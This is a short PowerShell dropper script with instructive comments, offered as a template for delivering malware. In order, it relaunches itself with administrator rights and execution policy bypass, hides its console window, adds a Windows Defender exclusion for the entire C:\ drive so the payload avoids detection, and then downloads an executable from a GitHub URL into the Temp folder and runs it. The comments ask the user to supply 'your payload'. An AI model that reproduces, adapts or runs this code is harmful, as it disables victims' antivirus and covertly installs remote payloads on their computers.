#############################################################################################################################

# (Administrator rights are privileges granted to users that allow them to perform most functions on a computer's operating system.)

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}

#############################################################################################################################

# (This prevents all commands from being visible in the terminal.)

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$console = [Console.Window]::GetConsoleWindow()
# 0 hide
[Console.Window]::ShowWindow($console, 0) | Out-Null

#############################################################################################################################

#(By adding exclusions for Windows Defender with Add-MpPreference, the script enables the downloaded payload to run without being flagged.)

Add-MpPreference -ExclusionPath C:\

#############################################################################################################################

# (Add the link to your payload.)

$url = "https://github.com/inhazkk/kalip/raw/refs/heads/main/Client-built.exe"

#############################################################################################################################

# (Temp is where your payload will be downloaded by default.)

$output = "$env:Temp/Client-built.exe"

#############################################################################################################################

# (This belongs the script installs your payload not touch it.)

Invoke-WebRequest -Uri $url -OutFile $output

#############################################################################################################################

# (Once the download is finished, execute the file that was downloaded.)

Start-Process -FilePath $output

#############################################################################################################################